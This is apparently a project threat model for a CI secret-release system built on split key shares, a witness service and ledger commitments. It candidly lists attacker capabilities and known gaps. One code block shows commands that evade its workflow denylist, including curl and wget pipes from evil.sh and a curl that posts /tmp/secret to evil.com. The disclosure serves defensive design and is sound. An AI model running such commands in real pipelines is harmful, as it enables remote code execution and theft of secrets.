# Threat model

The attacker we design against, the two properties we deliver, and — stated with the same precision
— what is out of scope. `docs/CLAIM.md` is the one-paragraph version; this is the engineering one.

## The invariant, stated exactly

**No secret is decrypted for the first time without a runner-authored, consensus-timestamped
commitment that the witness can neither omit nor forge.**

The word *first* is load-bearing and is not decoration. Share B is a pure function of
`(WITNESS_MASTER, project_id, secret, gen)` — `packages/witness/src/shares/derive.ts` — so the same
32 bytes come back on every release of that generation, and share A in the repository does not change
within a generation either. Anything that holds both, once, can decrypt that generation offline,
indefinitely, with no further payment and no further record. See "Share B is cacheable" below. The
guarantee is about the *first* release, and about it being impossible to perform silently.

## Attacker capabilities (in scope)

- Arbitrary code execution on any CI runner, via a malicious dependency, build plugin, or compromised
  action.
- Read access to that runner's environment, filesystem, and process memory; outbound network.
- Possession of everything that runner holds: `KLAXON_MEMBER` (the Key Ring member credential) and
  `KLAXON_PAY_KEY` (a Hedera account holding a few ℏ). **Assume both leak.**
- A stolen GitHub session (covered by the on-chain `unrevoke` path, which only the Ledger can sign).
- Compromise of the **witness alone** — its host, its database, its master key.
- A *past* runner compromise combined with a *later* witness compromise (disclosed and mitigated
  below).

## Two properties, two mechanisms

| Property | Mechanism | Holds against |
|---|---|---|
| **No single party can decrypt.** | `DK = A ⊕ B`. A is encrypted under the operator's Ledger Key Ring and lives in git; B is derived by the witness from its master and only ever released into an envelope sealed to a runner-generated ephemeral key. | Runner alone (has A; must pay for B — logged). Witness alone (has B, or the master that yields it; never A). Git alone (ciphertext, no credential, no B). |
| **Every first release is on a ledger the witness did not write.** | The runner pays on Hedera with the commitment hash as memo *before* the witness will act. `klaxon-verify` flags any payment with no matching witness message as `WITNESS WITHHELD`. | Witness omission — it cannot delete a record it never authored. Not against an attacker replaying a B it already holds; that needs no witness at all. |
| **The commitment cannot be forged or replayed.** | The OIDC token's `aud` is `klaxon:<h>`; `h` covers `{project, secret, gen, repository_id, run, attempt, environment, ephemeral keys}`; the witness cross-checks every GitHub-derived field in `C` against the token's own claims (an `aud` alone is attacker-chosen); release requires a signature by the ephemeral key; `h` is single-use. | Field substitution by a compromised witness; JWT replay from another runner; cross-project replay. |
| **Policy cannot be swapped.** | The policy hash is device-signed onto Sepolia; the witness reads the policy file from the repo at the token's `sha` and refuses on mismatch. | A witness serving a looser policy. |
| **Job identity is enforced, not declared.** | The witness fetches the workflow at the token's `sha` and refuses an environment-bearing job that matches its install denylist or uses an unpinned action. It is a denylist, not a sandbox — see "What check 5 actually is". | A stolen session adding `environment:` to a job whose steps say `npm ci`. |
| **Rotation actually invalidates.** | `rotate` re-splits under generation N+1 and replaces the upstream credential; the witness serves B only for the current generation. | A share A captured under generation N — *and* a share B cached under generation N. |

## Disclosed and bounded

- **After a legitimate release, code inside that authorized job can read the secret.** The record
  names the secret, environment, and run. You rotate that one — not sixty. This is blast-radius
  scoping, not prevention, and it is the product.

- **Share B is cacheable, so a generation survives exactly one honest release.**
  `deriveShareB(master, project_id, secret, gen)` is deterministic (`packages/witness/src/shares/derive.ts`).
  Every release of the same `(project, secret, gen)` returns byte-identical B; share A in git is
  unchanged for the life of that generation. So an attacker who is present for **one** legitimate
  release — or who obtains B any other way — can keep it, and from then on decrypt that generation's
  `.enc` offline: no payment, no OIDC token, no witness, no record. The commitment log will show one
  release and nothing after it.

  This is why the invariant says *first*. It is also why **rotation is the only real remediation**,
  and why `rotate` means *change the upstream credential*, not *re-encrypt the same value*. Treat one
  observed release under a compromised runner as full compromise of that generation.

- **Captured ciphertext + leaked credential** decrypts A on a later run without a new commitment.
  Credential leak *alone* does not bypass the log; credential plus captured ciphertext plus a cached
  B does, completely — until `rotate`. Rotation is mandated on every policy alarm.

- **Non-simultaneous runner + witness compromise:** a member credential leaked on day 1 plus a
  witness compromise on day 30 yields B for every generation that still exists. Mitigation is
  generation rotation after any runner compromise.

- **The device does not gate everything a member credential can do.** This is a correction to an
  earlier claim in this document, which said re-keying the trustchain "needs the physical device —
  that is a feature". It is only half true. From
  `@ledgerhq/ledger-key-ring-protocol@0.15.2`, `lib-es/types.d.ts`:

  | Operation | Signature | Device required |
  |---|---|---|
  | `getOrCreateTrustchain` | `(deviceId, memberCredentials, …)` | **yes** |
  | `removeMember` | `(deviceId, trustchain, memberCredentials, member, …)` | **yes** |
  | `addMember` | `(trustchain, memberCredentials, member)` | **no** |
  | `destroyTrustchain` | `(trustchain, memberCredentials)` | **no** |

  So the device gates *creating* a trustchain and *evicting* a member. It does **not** gate
  *enrolling* one or *destroying the whole thing*. A leaked `KLAXON_MEMBER` therefore buys the
  attacker two things beyond reading share A:

  1. **Permanent membership of its own choosing.** `addMember` needs no hardware. Evicting that
     member does, so the operator's cheapest remediation stays `ring destroy` + `ring init` — a new
     trustchain, which does need the device.
  2. **A destruct button.** `destroyTrustchain` needs no hardware. Every `a_ct` in the repository is
     encrypted under the wallet-sync encryption key that only that trustchain yields, so destroying
     it makes every protected secret permanently unrecoverable from the repository — including via
     `klaxon emergency`, which restores the Key Ring over the network like everything else. The
     `WITNESS_MASTER` on paper does not save you: it yields B, not A.

  **This is an availability hole with no mitigation inside KLAXON.** The honest statement of the
  property is: *the device gates the creation of trust, not the destruction of it.* Keep the upstream
  credentials recoverable by some path that is not this repository.

- **Ledger's Key Ring backend is a liveness dependency.** `restoreTrustchain` calls
  `trustchain.api.live.ledger.com` on every release. If it is unreachable, the runner fails closed
  *before* paying — no commitment is made, nothing to refuse. `emergency` needs it too. The floor is
  `ring init` recovery on the device.

- **The witness is a liveness dependency**, not a confidentiality one. Down → deploys block (fail
  closed). Infrastructure failures alarm but never revoke; only policy violations revoke.

- **The fee payer on the x402 path is the facilitator (Blocky402).** The runner signs the frozen
  transaction body — including the memo — and funds the value transfer; the facilitator sponsors the
  network fee. Neither the witness nor `verify` binds on `payer_account_id`, which is the
  facilitator's account and proves nothing. See `docs/PAYMENT-FLOW.md` § Accounting for exactly what
  each side binds on.

- **Old tokens and rotated JWKS.** `verify` validates recent tokens against GitHub's live keys and
  older ones against `jwks` snapshots the witness published to HCS daily. A snapshot is
  witness-authored: an old token is only as trustworthy as the witness *was on the day it published
  that snapshot* — before it could know which tokens it would later want to forge.

## What check 5 actually is

Check 5 is a **static denylist over literal `run:` strings**, plus a pin requirement on every
`uses:`. It is a guard against *fetching new code from a package manager inside the protected job*.
It is **not** a sandbox and does not attempt to be one.

The implementation is `packages/witness/src/lint/patterns.ts` (14 regexes) and
`packages/witness/src/lint/workflow-lint.ts`. It parses the workflow YAML at the token's `sha`, finds
the job whose `environment:` matches the release, and for each step tests `step.run` against the
denylist and `step.uses` against `owner/repo[/path]@<40-hex>` / `./local` / `docker://…@sha256:<64-hex>`.

**Things that pass the denylist** (each one run against the actual regexes):

```
make deploy                              ./gradlew build
yarn dlx tsx foo.ts                      docker run -v /:/host alpine sh -c …
bash <(curl -fsSL https://evil.sh)       source <(wget -qO- https://evil.sh)
curl -d @/tmp/secret https://evil.com    ./install.sh
```

`pnpm dlx` is caught and `yarn dlx` is not; `curl … | sh` is caught and `bash <(curl …)` is not. The
list matches strings, not shells, and a shell has more ways to fetch and run code than a list can
enumerate. Adding patterns narrows the gap and never closes it.

Two structural blind spots, which matter more than any individual missing pattern:

1. **It never dereferences a composite action.** A pinned `uses:` is checked for being pinned, and
   nothing else. The action's own `steps:` — which may install whatever they like — are never
   fetched or linted. A 40-hex pin proves immutability, not innocence.

2. **It never inspects a downloaded artifact — and the pattern this project recommends depends on
   one.** `docs/MIGRATION.md` § 2 tells you to split into an install/build job (no `environment:`, so
   *never linted*) and a deploy job that consumes its artifact via `download-artifact`. Check 5 lints
   the deploy job. Whatever the unlinted build job wrote into `dist/` executes in the protected job,
   next to the secret. A worm in the build job's dependency tree does not need to defeat check 5; it
   needs to write a file.

That path is real and we do not close it. What KLAXON closes is different: whatever runs in that job
still cannot obtain the secret without a paid, signed, consensus-timestamped commitment naming the
secret, the environment and the run. The artifact route gets the attacker *into* the authorized job;
it does not get them a silent decryption. That is the whole claim, and it is the same claim as for a
compromised dependency of the deploy job itself.

## Revocation is announced, not anchored

`KlaxonRegistry` (`packages/contracts/src/KlaxonRegistry.sol`) has three functions — `register`,
`commitPolicy`, `unrevoke` — and emits three events: `Registered`, `PolicyCommitted`, `Unrevoked`.
**There is no `revoke()` and no `Revoked` event.** Revocation is not on-chain state.

How it actually works:

- **Announced on HCS.** `POST /revoke` writes the `revocation` row and the outbox entry in one
  transaction, then publishes `{type:"revoke", reason, epoch}` to the project's topic. The
  announcement is durable and lives somewhere the witness cannot rewrite.
- **Enforced from SQLite.** Check 8 reads `projects.revoked` and `local_epoch == chain_epoch` from
  the witness's local database (`packages/witness/src/checks/c789-atomic.ts`).
- **Cleared on chain.** Only a device-signed `Unrevoked(p, epoch)` on Sepolia advances `chain_epoch`
  and lets releases resume.

Two consequences, stated plainly:

1. **A wiped witness volume silently un-revokes.** `revoked` and the epoch counters are SQLite
   state. A fresh database re-learns projects on the next `/projects` call with `revoked = 0`, and
   the witness resumes serving. Nothing on any chain says otherwise.
2. **`verify` catches the announced case, and only that case.** Because the `revoke` message is on
   HCS, `packages/verify/src/aggregate.ts` reports `RELEASE_WHILE_REVOKED` for any `released`
   published after a `revoke` and before the on-chain `Unrevoked` that clears it — a witness that
   ignores a revocation it already announced is caught by a third party. What is **not** caught is a
   revocation that never reached HCS: if the volume dies between the transaction commit and the
   outbox drain, the row and the outbox entry go together, no message is ever published, and there is
   nothing for `verify` to compare a later release against.

**The asymmetry with `unrevoke` is deliberate.** Revoke is the emergency stop: it must work in
seconds, from a phone, with no device and no funded chain account, or it will not be used when it
matters. Unrevoke is the resumption of trust: it is the one that must be expensive, and it is
device-signed, monotonic, and on chain. Putting revoke on chain too would put a hardware wallet — or
a hot key — in the stop path. The price of that choice is exactly the durability gap above, and we
would rather state it than pretend the SQLite row is a ledger.

## Out of scope

Simultaneous compromise of a runner **and** the witness; Hedera consensus; the operator's laptop
during `init`, `add`, `rotate`, or `export-member`; a GitHub session with admin rights that also
rewrites environment protection rules (GitHub's control — KLAXON assumes it is on); the mainnet
deployer key, which should live in a Safe with signers on Ledgers, not in CI — KLAXON's own docs say
so.
